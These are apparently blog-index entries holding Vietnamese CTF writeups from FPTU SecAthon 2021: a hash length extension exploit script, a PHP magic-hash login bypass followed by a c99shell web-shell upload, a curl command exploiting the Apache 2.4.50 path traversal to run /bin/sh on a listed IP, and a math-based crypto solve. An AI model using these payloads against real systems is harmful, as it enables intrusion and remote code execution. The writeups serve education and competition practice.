parse_qsl(self, query): m = {} parts = query.split(b&#39;&amp;amp;&#39;) for part in parts: key, val = part.split(b&#39;=&#39;) m[key] = val return mVới cách hàm parse hoạt động như này, giả sử query có 2 cặp giá trị của price (ví dụ như price=99999&amp;amp;price=0) thì giá trị price cuối cùng sẽ được quyết định bởi cái đằng sau. Điều đó đồng nghĩa với việc nếu mình có thể kéo dài cái payment của mình bằng cách append thêm 1 đoạn &amp;amp;price=0, mình có thể mua bất cứ thứ gì trong cửa hàng!Ý tưởng kéo dài 1 đoạn payment được hash đã đưa mình đến hash length extension attackHash length extension attackHash length extension attack là gì?Hash length extension attack cho phép mình kéo dài chuỗi văn bản được hash, đồng thời tính toán giá trị hash mới hợp lệ cho chuỗi văn bản được kéo dài ra từ hash của chuỗi văn bản ban đầu.Nguồn đọc hiểu hash length extension attackTrước hết, cần phải hiểu được sha512 hoạt động như thế nào đã. Bạn có thể xem tổng quan về hàm sha512 tại đây và xem chi tiết cách sha512 vận hành từng bước 1 tại đây. Thanks for Indian guys ❤️Tiếp đó, mình đọc mô tả cách hash length extension attack hoạt động, và có bản demo tại đây. Thực ra trước có 1 bài blog bằng tiếng Việt cho họ hash SHA luôn, mà giờ trang đấy sập rồi 😢 Nên mình sẽ mô tả lại trong bài này để các bạn hiểu dưới góc độ python code, phòng trường hợp các bạn đọc demo trên mạng đều code bằng C và không hiểu gì =)))Điều kiện để thực hiện hash length extension attackĐể thực hiện được hash length extension attack mà văn bản xác thực có dạng secret_value + public_value, mình cần có đủ 3 dữ kiện: Độ dài của secret_value, ở trong bài này chính là độ dài của signkey. Bài không cho cụ thể nhưng chỉ cho 24 giá trị khả năng, hoàn toàn có thể bruteforce. Mình không cần giá trị của secret_value! Giá trị của public_value, ở trong bài này chính là payment Giá trị hash của secret_value + public_value, ở trong bài này chính là sign Vậy là bài này hội tụ đủ cả 3 yếu tố để tiến hành rồi.Tiến hành tấn công thôi!Mục tiêu của mình bao gồm: Append thêm 1 đoạn &amp;amp;price=0 vào cuối payment Tạo ra 1 giá trị sign mới sao cho sha512(signkey+payment) = sign với payment mới Sơ sơ cơ chế hoạt động của hash length extension attack sẽ như sau: Cơ chế hoạt động của hàm hash: Hàm hash sha512 sẽ chia input đầu vào thành các khối 1024 bits, mỗi khối lại chia thành từng phần nhỏ h[i] gồm 128 bits. Một tuple (h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7]) được gọi là current_state của hàm hash hiện tại. current_state sẽ được dùng để tính state cho khối 1024 bits tiếp theo. Hàm xử lý quá trình này gọi là round_function hoặc compress (tùy theo tài liệu). Kết quả cho khối 1024 bits cuối cùng chính là giá trị hash mình thu được. Cơ chế hoạt động của hash length extension attack: Từ cơ chế hoạt động trên của hàm hash, mình có thể thấy rằng chỉ cần biết được current_state và khối 1024 bits cuối cùng, mình hoàn toàn có thể tính toán state cho khối 1024 bits tiếp theo, trong đó, khối 1024 bits sẽ có giá trị tùy ý mình thích. Đó cũng chính là giá trị hash mới với chuỗi văn bản được kéo dài. Khá là đơn giản phải không. Giờ mình sẽ đi vào cụ thể nhé: Order FLAG, nhận giá trị order trả về product=FLAG&amp;amp;price=99999&amp;amp;time=1633849486.36&amp;amp;sign=275e626950c677c05a669e4e9d73f015858ca2b477335b2e99f419f9f0bc860736e95bd87de1226764c70f8c59029edc10e6b2a514342bb85f0c29fe24b9d3e2. Tách payment và sign riêng. Padding cho payment để payment có dạng k ∗ 1024, và lấy block cuối cùng, thu được product=FLAG&amp;amp;price=99999&amp;amp;time=1633849486.36\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02P. Vốn chuỗi ban đầu không dài hơn 1024 bits nên cũng chỉ có block duy nhất. Trong phần ví dụ này, mình giả sử độ dài của signkey bằng 31. Cơ chế padding mình đính kèm nguồn ở trên. Append chuỗi &amp;amp;price=0 vào chuỗi đã được padding ở trên. Lại tạo 1 khối 1024 bits có chứa &amp;amp;price=0 bằng cách padding, thu được &amp;amp;price=0\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x018 Extract state từ giá trị sign, sau đó đưa state cùng khối 1024 bits có chứa &amp;amp;price=0 ở trên vào hàm compress của sha512, thu được giá trị mới bằng ad38b9ceecbdf41de6bb33970a473ecc1c500935e2cfd90007be639fa6754b6272c45340fca0f173090748722cc1e25e3440cc9975c3b712a8cabe7809cf6d7f Nối chuỗi payment mới và sign mới vào với nhau, chuyển lên server và lấy flag. order mới sẽ là product=FLAG&amp;amp;price=99999&amp;amp;time=1633849486.36\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02P&amp;amp;price=0 Vậy là xong!Full code exploitVì bài không cho giá trị cụ thể của độ dài signkey, nên mình phải viết 1 đoạn code chạy tự động trong khoảng giá trị [8, 32]. Full code exploit có thể xem ở đây. Trong code này, mình có sử dụng lại thư viện hlextend của stephenbradshaw trên github, với một chút chỉnh sửa để output ra có dạng byte thay vì string.def solve(): [REDACTED] #order output = recvuntil(clientSock, b&#39;Your choice:&#39;) clientSock.sendall(b&#39;2\\n&#39;) output = recvuntil(clientSock, b&#39;ID:&#39;) clientSock.sendall(b&#39;6\\n&#39;) output = recvuntil(clientSock, b&#39;Your choice:&#39;) order = output.split(b&#39;\\n&#39;)[0][len(&#39;Your order:&#39;):].strip() order = b64decode(order).decode(&#39;latin-1&#39;) sp = order.rfind(&#39;&amp;amp;sign=&#39;) sign = order[sp+6:] payment = order[:sp] append_msg = &#39;&amp;amp;price=0&#39; for i in range(8, 33): sha = hlextend.new(&#39;sha512&#39;) new_payment = sha.extend(append_msg, payment, i, sign) new_sign = sha.hexdigest() new_order = new_payment + b&#39;&amp;amp;sign=&#39; + new_sign.encode() new_order = b64encode(new_order) #confirm order clientSock.sendall(b&#39;3\\n&#39;) output = recvuntil(clientSock, b&#39;Your order:&#39;) clientSock.sendall(new_order + b&#39;\\n&#39;) output = recvuntil(clientSock, b&#39;Your choice:&#39;) if b&#39;FUSec{&#39; in output: flag = output.decode()[output.index(b&#39;FUSec{&#39;):output.index(b&#39;}&#39;)+1] print(flag) breakFlag FUSec{th1s_1s_4n_0ld_vul_bUt...}CRY303Một bài siêu khó về Knapsack cipher sử dụng LLL (Lenstra–Lenstra–Lovász), hay còn gọi là Latice Reducation Technique, để giải.Nói thật thì bài này mình cũng không tự làm được lúc tham gia giải CTF, nhưng search google được 1 bài giống tới 90%, nên chỉ đọc hiểu code rồi giải lại. Bởi vì bài cũng không có gì khác biệt mấy, nên mình để nguồn bài gốc ở đây để các bạn đọc vậy. Link github exploit code + writeup Bài viết cụ thể giải thích cơ chế hoạt động Đề bài này và code giải (đã sửa theo bài) mình để ở github của mình. Thế là hết crypto rồi. Nếu mà kịp giải hết thì mình cũng mạnh dạn insert bomman meme gáy… nhưng không được nên gà không gáy nữa…" }, { "title": "FPTU SecAthon 2021 | Cryptographic Writeup | CRY301", "url": "/posts/FuSec4-CRY301/", "categories": "CTF, Cryptographic Challenges", "tags": "writeups, cryptographic, fusec21", "date": "2021-10-10 10:00:00 +0700", "snippet": "CRY301Source code and analysisMột bài crypto giải bằng kiến thức toán học và tư duy về code. Full source code đề bài xem tại đâyBài này yêu cầu mình tìm được số x ban đầu từ kết quả của 2 hàm easyone(x) và alittlebitharderone(x).Phân tích hàm easyone(x)Nhìn sơ qua hàm easyone(x), có 3 phép biến đổi chính được lặp đi lặp lại 3 lần: Phép xor với left shift bit của chính nó Phép nhân Phép &amp;amp; với 0xffffffffffffffffffffffffffffffff. def easyone(x): assert(x &amp;lt; 2 ** 128) x ^= x &amp;gt;&amp;gt; (64 + 19) x *= 0xd3856e824d9c8a26aef65c0fe1cc96db #281159923981539500379670095774511568603 x &amp;amp;= 0xffffffffffffffffffffffffffffffff x ^= x &amp;gt;&amp;gt; (64 + 3) x *= 0xe44035c8f8387dc11dd3dd67097007cb #303397380928069120521467215513016862667 x &amp;amp;= 0xffffffffffffffffffffffffffffffff x ^= x &amp;gt;&amp;gt; (64 + 20) x *= 0xc9f54782b4f17cb68ecf11d7b378e445 #268448390289851351177030176676964262981 x &amp;amp;= 0xffffffffffffffffffffffffffffffff x ^= x &amp;gt;&amp;gt; (64 + 2) return xNhư vậy, có 2 bài toán đặt ra cần giải quyết: Tìm x biết a * x = b (mod n) với a, b, n đã cho trước Khôi phục lại kết quả phép xor. Tìm x có $a \\oplus x = b$ với a, b đã biết, khá đơn giản với $x = a \\oplus b$. Cùng đi sâu hơn chút vào từng bài toán 1 nhéBài toán đầu tiênĐây là bài toán cơ bản cơ bản về inverse mod (modular inverse) trong finite field (trường hữu hạn). Đơn giản, mình có thể tìm $x$ bằng cách $x = a^{-1} * b$ $(mod$ $n)$, trong đó, $a^{-1} * b$ $(mod$ $n)$ là giá trị inverse modulo của a trong finite field $(mod$ $n)$Chi tiết cách tìm inverse mod bằng toán học với extended euclidean algorithm có thể xem tại đây. Lúc code giải thì mình dùng luôn hàm invert(a, n) trong thư viện gmpy2 của python để tìm $a^{-1} * b$ $(mod$ $n)$.Mình chuyển 1 đoạn code sang dạng bài toán gốc để dễ hình dung. Cụ thể, đoạn code dưới đây biểu diễn dưới dạng toán học sẽ là $x * 281159923981539500379670095774511568603 = b$ $(mod$ $n)$ với b có thể thu được từ việc dịch lại phép xor (bài toán 2). Lưu ý: x &amp;amp;= 0xffffffffffffffffffffffffffffffff &amp;lt;=&amp;gt; x %= 0xffffffffffffffffffffffffffffffff hay x %= 2**128x *= 0xd3856e824d9c8a26aef65c0fe1cc96db #281159923981539500379670095774511568603x &amp;amp;= 0xffffffffffffffffffffffffffffffffNhư vậy, ta có thể dễ dàng tìm x với $x = b$ $∗$ $281159923981539500379670095774511568603^{−1}$ $(mod$ $2^{128})$x *= gmpy2.invert(268448390289851351177030176676964262981, 2**128)x &amp;amp;= 0xffffffffffffffffffffffffffffffffVấn đề là để hoàn thiện quá trình giải thì mình cần tìm b, nghĩa là cần phải giải quyết bài toán số 2.Bài toán thứ 2Để giải quyết phần xor này, chúng ta cần phải lưu tâm x sau khi bitshift thì còn những bit nào còn giữ nguyên, bit nào dịch chuyển để thực hiện xor.x ^= x &amp;gt;&amp;gt; (64 + 2)Để dễ hình dung, bạn có thể nhìn hình mô phỏng trước và sau khi leftshift dưới đây. Bit màu xanh là những bit còn giữ nguyên sau khi leftshift. Bit màu vàng là bit màu xanh được chuyển ra sau khi leftshift. Bit màu đỏ là những bit có thể bị thay đổi sau bitshift (và cũng là bit thực sự tham gia xor)Dễ dàng nhận thấy, phần bit dùng để xor với giá trị x ban đầu vẫn giữ nguyên sau khi xor $\\longrightarrow$. Như vậy mình có thể dễ dàng khôi phục phần bit dùng để xor bằng cách leftshift lại giá trị sau khi xor bằng đúng một khoảng dùng để xor trước đó (tức leftshift (64 + 2) đơn vị trong trường hợp trên).Kết luận trên đúng với tất cả trường mà x được leftshift ít nhất 64 đơn vị.Vậy là mình đã giải quyết xong cả 2 bài toán trên! Cuối cùng mình có đoạn code để lấy giá trị x từ hàm easyone(x) như sau:def solveeasyone(x): x ^= x &amp;gt;&amp;gt; (64 + 2) x *= gmpy2.invert(268448390289851351177030176676964262981, 2**128) x &amp;amp;= 0xffffffffffffffffffffffffffffffff x ^= x &amp;gt;&amp;gt; (64 + 20) x *= gmpy2.invert(303397380928069120521467215513016862667, 2**128) x &amp;amp;= 0xffffffffffffffffffffffffffffffff x ^= x &amp;gt;&amp;gt; (64 + 3) x *= gmpy2.invert(281159923981539500379670095774511568603, 2**128) x &amp;amp;= 0xffffffffffffffffffffffffffffffff x ^= x &amp;gt;&amp;gt; (64 + 19) return int(x)Tada, first round~~Phân tích hàm alittlebitharderone(x)Giải quyết hàm này cũng cần giải quyết 2 bài toán như hàm easyone(x). Bài toán 1 về tìm inverse mod hoàn toàn giống hệt. Cái khó hơn nằm ở Bài toán 2, do mình không thể ngay lập tức khôi phụ được bit dùng trong phép xor trước đó từ kết quả thu được.Tuy nhiên, điều đáng mừng là nguyên lý cách làm vẫn thế. Chúng ta cũng sẽ dùng những bit còn nguyên, để khôi phục lại những bit gốc, rồi lân la dần dần để khôi phục toàn bộ bit gốc đó. Mình mô phỏng với 1 bài toán nhỏ với 1 chuỗi 6 bit với độ leftshift bằng 2 như sau:Với trường hợp như trên, mình khôi phục lại giá trị ban đầu của x bằng cách đi qua từng bước như sau đây (Mô tả bằng hình ảnh cho dễ hiểu nhé) Xor 2 bit đầu (2 bit còn giữ nguyên sau khi xor) với 2 bit liền kều sau nó. Những bit còn lại giữ nguyên. Như vậy, mình đã khôi phục lại được bit số 3 và bit số 2: Xor tiếp 2 bit vừa thu được (bit số 3 và 2) với 2 bit liền kề sau nó để khôi phục tiếp 2 bit còn lại (bit 5 và 6) : Vậy làm mình đã thu lại được đoạn bit gốc, tức giá trị của x cần tìm. Với chuỗi bit dài hơn, mình chỉ cần chạy quá trình trên lặp đi lặp lại là được.Dễ rồi phải không? Mặc dù mình nghĩ ra được ý tưởng mình việc code tốn của mình tận 30 phút… và cuối cùng lại chỉ thành 1 đoạn code ngắn ngủi sau:def xor(a, b): return &#39;&#39;.join(str(int(_a) ^ int(_b)) for _a, _b in zip(a, b))def shiftsolong(x, bitshift): x = &#39;{0:b}&#39;.format(x) for i in range(0, len(x) - bitshift): x = x[:bitshift*(i+1)] + xor(x[bitshift*i:bitshift*(i+1)], x[bitshift*(i+1):bitshift*(i+2)]) + x[bitshift*(i+2):] return int(x, 2)Ta nói đời về căn bản là buồn mà 😢 Thôi tổng hợp lại, thì mình có đoạn code lấy lại giá trị x từ hàm alittlebitharderone(x):def solvehardone(x): x = shiftsolong(x, 2) x *= gmpy2.invert(268448390289851351177030176676964262981, 2**128) x &amp;amp;= 0xffffffffffffffffffffffffffffffff x = shiftsolong(x, 20) x *= gmpy2.invert(303397380928069120521467215513016862667, 2**128) x &amp;amp;= 0xffffffffffffffffffffffffffffffff x = shiftsolong(x, 3) x *= gmpy2.invert(281159923981539500379670095774511568603, 2**128) x &amp;amp;= 0xffffffffffffffffffffffffffffffff x = shiftsolong(x, 19) return int(x)Qua vòng 2 và nhận được flag. Chỉ là không kịp submit nữa…Nếu có ước muốn trong cuộc đời này, mình sẽ ước có một không gian riêng mà thời gian chảy chậm để ngồi debug trước khi hết giờ FUSEC 😇" }, { "title": "FPTU SecAthon 2021 | Web Writeup | IAW302", "url": "/posts/FuSec4-IAW302/", "categories": "CTF, Web Challenges", "tags": "writeups, web, fusec21", "date": "2021-10-09 23:30:00 +0700", "snippet": "IAW302 Bài này rất đúng với mô tả của người ra đề, một người anh (không hề) lừa: “G(old)”. Một ví dụ điển hình cho một lỗi điển hình của PHP String :)) Truy cập vào bài, ta có login form: Thử xem source code của bài xem sao? (Source code khá dài, nên mình sẽ cắt từ đoạn form đến hết hint) &amp;lt;form action=&quot;verify.php&quot; method=&quot;post&quot;&amp;gt; User Name:&amp;lt;br&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;username&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; Password:&amp;lt;br&amp;gt; &amp;lt;input type=&quot;password&quot; name=&quot;password&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;!-- if(isset($_POST[&#39;submit&#39;])){ if ((int) $_POST[&#39;password&#39;] === (int) &quot;8xdeadbeef&quot;){ $usr = $_POST[&#39;username&#39;]; $pas = hash(&#39;sha256&#39;, htmlentities($_POST[&#39;password&#39;])); if($pas == &quot;0&quot; &amp;amp;&amp;amp; strcmp(&quot;ahihi&quot;, $usr) == 0 &amp;amp;&amp;amp; $usr != &quot;ahihi&quot;){ session_start(); $_SESSION[&#39;logged&#39;] = TRUE; header(&quot;Location: chall.php&quot;); exit; } }else{ header(&quot;Location: index.php&quot;); exit; } }else{ header(&quot;Location: index.php&quot;); exit; } ?&amp;gt; Vậy là chúng ta có gợi ý về code PHP của back-end, hãy thử phân tích nó một chút, để dễ dàng theo dõi, mình sẽ gán đoạn PHP vào Vim để nhìn theo line-number: Tại dòng thứ 3, ta có thể thấy toán tử so sánh === (cùng loại, cùng giá trị), (int) &quot;8xdeadbeef&quot; có giá trị là 8, như vậy password cần mang giá trị 8 khi ép về int Nói qua một chút về việc ép String về Integer trong PHP, hãy để ý chuỗi 8xdeafbeef, chuỗi này bắt đầu bằng số 8, nên khi ép về int thì sẽ mang luôn giá trị là 8, để dễ hình dung thì chúng ta thử trên PHP luôn: Như vậy ta biết password sẽ bắt đầu bằng 8 và kế tiếp là các kí tự không phải kí tự số như 8anhtunglua chẳng hạn :&amp;gt; Ta biết password sẽ được hash SHA256, và không có salt (Dòng 5) Tại dòng 6 ta có 3 điều kiện với 3 phép so sánh: == và != (so sánh giá trị, không so sánh kiểu) và strcmp() (so sánh 2 string, trả về 0 nếu giống nhau): Hãy để ý đến phép so sánh $pas == &quot;0&quot;, đây là một huyền thoại của PHP :&amp;gt; Ta biết rằng $pas được hash SHA256 rồi mới đem vào so sánh, phép so sánh == giữa một chuỗi hash và &quot;0&quot; trong PHP sẽ gây ra lỗi liên quan đến Magic Hash, cụ thể thì những chuỗi hash bắt đầu bằng &quot;0e&quot;, khi so sánh == với &quot;0&quot; sẽ luôn trả về giá trị đúng xD, bạn có thể tìm hiểu về magic hash, không chỉ SHA256 mà còn nhiều dạng khác tại đây Như vậy, password phải bắt đầu bằng 8 và có mã hash SHA256 bắt đầu bằng &quot;0e&quot;, theo link ở trên, mình tìm được mã này: 8W-vW:5ghashcat:0e99625202804787226908207582077273485674961623832383874594371630 (note: the plaintext has a colon in the middle) Như vậy password sẽ là 8W-vW:5ghashcat Tiếp đến 2 điều kiện còn lại của dòng 6: strcmp(&quot;ahihi&quot;, $usr) == 0 &amp;amp;&amp;amp; $usr != &quot;ahihi&quot; :D ??? Mới đầu đọc mình cũng hơi bị lú tí, làm thế nào mà strcmp thì trả về 0 (giống nhau) mà đằng sau lại khác nhau cho được :D ???, nhưng, có một điều về strcmp trong PHP, hay nói đúng hơn là cái == chết tiệt của PHP: Trong PHP, khi so sánh NULL == 0 thì sẽ trả về true :D ??? Không đùa đâu, nó trả về true thật :&amp;gt; Đọc thêm tại đây Có một cách để khiến strcmp trả về NULL, đó là so sánh Array và String :&amp;gt; Hãy đọc thêm tại đây Như vậy điều ta cần là nhập username dưới dạng Array, but how to do that? Để ý đến source code form của username: &amp;lt;input type=&quot;text&quot; name=&quot;username&quot;&amp;gt;, ta thấy khi submit, query string sẽ có dạng ?username=anything&amp;amp;password=anything đúng không? Vậy muốn đổi từ ?username= sang ?username[]= thì đơn giản ta chỉ cần sửa lại code HTML của username form thành &amp;lt;input type=&quot;text&quot; name=&quot;username[]&quot;&amp;gt; Bây giờ tiến hành nhập username (mình để ahihi cho theo ý thích của người ra đề :&amp;gt;) và password 8W-vW:5ghashcat và đây là kết quả: Ta đã vào được trang chall.php đúng như điều kiện của back-end PHP ở trên, Ctrl U để xem source code nào: if(isset($_FILES[&#39;file&#39;])){ if($_FILES[&#39;file&#39;][&#39;size&#39;] &amp;gt; 1048576){ $errors=&#39;File size must be excately 1 MB&#39;; } if(empty($errors)==true){ $up = &quot;uploads/&quot;.rand().&quot;.&quot;.explode(&quot;.&quot;,$_FILES[&#39;file&#39;][&#39;name&#39;])[1]; move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$up); echo &quot;File uploaded successfully\\n&quot;; echo &#39;&amp;lt;p&amp;gt;&amp;lt;a href=&#39;. $up .&#39; target=&quot;_blank&quot;&amp;gt;File&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&#39;; }else{ echo $errors; } } Đây là source code PHP cho phần upload file, có thể thấy ta có thể upload bất cứ file gì, miễn là đừng vượt quá 1048576 bytes là được Mình sử dụng một file có tên là c99shell.php để upload, truy cập vào file và ta có toàn bộ file được upload lên :v Lul, có vẻ flag không có ở đây, và nếu để ý thì tất cả file đều chỉ có quyền read mà thôi :v như vậy mình không thể dùng command rồi :v mình thử truy cập vào thư mục cha của thư mục hiện tại, và mình thấy file này: Thử dùng path traversal để mở file fl@@@g_1337_ahiahi.txt xem sao :v Vậy là đã có flag: FUSec{Muốn giết một con rồng, máu phải chảy thành sông_Tai nạn quá, không sao, winable, winable guys} Một bài khá dài hơi, flag này chả trách ông anh T giấu tên cứ nhắc đến “Kẻ giết rồng” :)) Có một cách đơn giản, mà hay ho hơn để làm bài này Đầu tiên, chuẩn bị 1 file PHP như sau: &amp;lt;?php phpinfo(); ?&amp;gt; Tìm disable_functions, thu được danh sách các funcion bị chặn: Như vậy, rất nhiều function liên quan đến command và file handling bị chặn, nhưng có 2 hàm không bị chặn: dir và include Đầu tiên cần list file: &amp;lt;?php $cur = dir(&quot;.&quot;); $par = dir(&quot;..&quot;); echo &quot;Current:&amp;lt;br&amp;gt;&quot;; while (($file = $cur-&amp;gt;read()) !== false){ echo &quot;filename: &quot; . $file . &quot;&amp;lt;br&amp;gt;&quot;; } echo &quot;Parent:&amp;lt;br&amp;gt;&quot;; while (($file = $par-&amp;gt;read()) !== false){ echo &quot;filename: &quot; . $file . &quot;&amp;lt;br&amp;gt;&quot;; } $cur-&amp;gt;close(); $par-&amp;gt;close(); ?&amp;gt; Upload lên và mở file, thu được danh sách file trong thư mục hiện tại và thư mục cha, để ý thấy trong thư mục cha có file fl@@@g_1337_ahiahi.txt, đến đây thì path traversal cũng được, tạo file PHP cũng được: &amp;lt;?php echo &quot;&amp;lt;p&amp;gt;&quot;; include &#39;../fl@@@g_1337_ahiahi.txt&#39;; echo &quot;&amp;lt;/p&amp;gt;&quot;; ?&amp;gt; Dù là cách nào thì cuối cùng cũng thu được flag: " }, { "title": "FPTU SecAthon 2021 | Web Writeup | IAW301", "url": "/posts/FuSec4-IAW301/", "categories": "CTF, Web Challenges", "tags": "writeups, web, fusec21", "date": "2021-10-09 20:30:00 +0700", "snippet": "IAW301 Đây là một challenge dễ, nhưng thật tiếc vì mình lú nên đã gõ sai một kí tự trong payload mà không biết :’(Xin úp mặt vào tường để tự kiểm điểm :’( Bắt đầu với challenge, ta được cung cấp 2 dữ liệu, file httpd.conf, và gợi ý về flag: httpd.conf là file config của Apache Server, truy cập vào file theo đường dẫn, mình nhận thấy có một số thứ hay ho: &amp;lt;Directory &quot;/usr/local/apache2/cgi-bin&quot;&amp;gt; AllowOverride None Options None Require all granted &amp;lt;/Directory&amp;gt; Trong thời gian gần đây, có 2 CVE nổi tiếng liên quan đến 2 phiên bản của Apache và cgi-bin của nó, đó là CVE-2021-41773 (Apache 2.4.49) và CVE-2021-42013 (Apache 2.4.50), đặc điểm chung là lỗi trong việc normalize path ở file util.c khiến tin tặc có thể sử dụng path traversal với payload thường thấy là /cgi-bin/../../../etc.passwd, nhưng, vì util.c đã check dấu . khi normalize path, nên chúng ta sẽ cần dùng tới những payload được encode như /.%2e/ thay cho /../. Tất nhiên, giữa 2 CVE kể trên có sự khác nhau trong payload, vì vậy chúng ta cần check xem Apache đó thuộc phiên bản nào (nếu &amp;gt; 2.4.50 thì kiếp này coi như bỏ :’() Mình thử check với câu lệnh nmap đơn giản sau: nmap -A -p8889 139.180.208.121 -vvv Và có được kết quả: PORT STATE SERVICE REASON VERSION 8889/tcp open http syn-ack Apache httpd 2.4.50 ((Unix)) | http-methods: | Supported Methods: HEAD GET POST OPTIONS TRACE |_ Potentially risky methods: TRACE |_http-title: Site doesn&#39;t have a title (text/html). |_http-server-header: Apache/2.4.50 (Unix) Như vậy là Apache 2.4.50, ta có thể dùng %%32%65%%32%65/ hoặc .%%32%65/ thay thế cho ../ Có một lưu ý là khi đọc httpd.conf, hãy để ý đến dòng ScriptAlias để biết liệu có alias nào thay cho cgi-bin không, ví dụ như trong bài này: ScriptAlias /nothingspecial/ &quot;/usr/local/apache2/cgi-bin/&quot; Và để ý DocumentRoot như trong bài: DocumentRoot &quot;/usr/local/apache2/htdocs&quot; Như vậy để truy cập được / thì ta cần 4 cặp ../, thay thế alias và 2 cách encode đã kể trên, ta có payload: /nothingspecial/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag Nhưng, như vậy liệu có đúng? Thử với curl và đây là kết quả: Thực tế có một cách khác, ta sẽ dùng đến /bin/sh và option --data của curl để mở file, đơn giản như sau: curl &#39;http://139.180.208.121:8889/nothingspecial/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#39; --data &#39;echo; cat ../flag&#39; Và đây là kết quả: Flag: FUSEC{970c5c12bc41fd2783748e73fccf99b0} Xin lỗi cả team noname vì mỡ đến miệng rồi mà để tuột mất vì một dấu % thừa :’(" }, { "title": "Reverse Engineering", "url": "/posts/Reverse-Engineering/", "categories": "Wiki, Reverse Engineering", "tags": "wiki, re", "date": "2021-10-04 20:07:00 +0700", "snippet": "Reverse engineering là gì?Dịch ngược (reverse engineering) trong An toàn thông tin là quá trình hiểu cách thức hoạt động của chương trình (hoặc phần cứng, nhưng trong bài viết này tạm thời chưa đề cập) với đầu vào (input) là đoạn nhị phân được biên dịch từ mã nguồn (source code.)Chương trình được viết từ ngôn ngữ cấp cao, ví dụ như C, sau đó được biên dịch (compile) thành ngôn ngữ máy chỉ bao gồm 0 và 1 để có thể chạy (execute.) Khi ai khác chạy chương trình trong tình trạng không có source code, reversing đóng vai trò dịch ngược từ ngôn ngữ máy đang được thực thi về dạng hợp ngữ (assembly)—ngôn ngữ thân thiện và dễ hiểu hơn đối với con người.Reverse engineering làm được gì?Cốt lõi của reversing là hiểu chương trình chạy như thế nào trong bối cảnh không có source code. Ứng dụng của reverse engineering là vô hạn, nhưng hiện tại đang phổ biến hai nhánh chính là: Phân tích mã độc: Mã độc được cài cắm ở khắp mọi nơi. Có thể nó ở trong đường link hay file đính kèm của một email vô danh được gửi vào hòm thư của bạn. Có thể nó ở một trang web mà chỉ cần mở nó lên là mã độc được tự động tải về máy của bạn. Có thể nó ở trong một phần mềm mà nhìn tưởng là vô hại nhưng thực ra lại đang chạy mã độc. Bằng việc phân tích mã độc, chúng ta có thể xây dựng giải pháp để xác định mã độc (malware detection.) Dựa vào chữ ký file (file signature) của những malware đã từng bị phát hiện, các phần mềm chống mã độc (antimalware software) đọc file signature và cảnh báo hoặc xóa bỏ các file khả nghi. Một số file signature khả nghi có thể kể đến các file có đuôi (extension) .jar, .dll, .bat, .cmd, .ps1, .reg hoặc .exe. Điển hình và phổ biến nhất trong nhánh này là Windows Defender. Disclaimer. Thay đổi file extension không làm ảnh hưởng tới file signature và điều này sẽ được giải thích kỹ hơn trong bài viết về Forensics. Nhưng cảnh cáo trước là không phải file .pdf nào cũng thật sự là .pdf đâu, cẩn thận nó biết “chạy” đấy. Kiểm định mã nguồn: Sự phát triển của kỹ thuật phần mềm (software engineering) yêu cầu reverse engineering cũng phải tiến bộ theo. Thời kỳ phần mềm chỉ cần chạy đúng chức năng là đủ đã qua từ lâu, nhà phát triển (developer) phải đảm bảo phần mềm không bị crack bởi các crackers. Ngoài ra, người dùng ngày nay quan tâm tới việc giữ kín thông tin cá nhân nên việc hạn chế các lỗi bảo mật tỏ ra cần thiết hơn bao giờ hết. Quá trình kiểm định mã nguồn của reverse engineering có đặc điểm là không được tiếp xúc với source code. Góc nhìn từ reverse engineering giống với góc nhìn của một cracker ở chỗ này, vì thế chúng ta có thể xây dựng các phương pháp để ngăn chặn reverse (anti-reversing) như làm rối hóa (obfuscating), ảo hóa mã nguồn (virtualizing source code), gói mã nguồn (packing source code),… Hãy nghĩ tới việc những phần mềm phổ biến mà hầu như ai cũng sử dụng như hệ điều hành Windows, Zoom—nơi tổ chức các lớp học và cuộc họp online hoặc ứng dụng PC-Covid có lỗi bảo mật nghiêm trọng. Động lực cho reverse engineering phát triển có lẽ được bắt nguồn từ đây. Hoặc nếu như trường của bạn có phần mềm thi E** hoặc P**. (jk) Reverse engineering cần gì?Reverse engineering là một ngành khó. Làm việc trên assembly và các thanh ghi bộ nhớ đòi hỏi sự am hiểu về assembly, tổ chức và kiến trúc máy tính. Các phần mềm lại còn phụ thuộc vào nền tảng (platform-based), ví dụ như chỉ hoạt động trên Windows 32-bit, hoặc chỉ hoạt động trên Windows 64-bit, hoặc chỉ hoạt động trên macOS, iOS,… khiến lượng kiến thức cần phải biết tăng lên đáng kể. Ngoài ra cần thành thục tool để dịch ngược từ ngôn 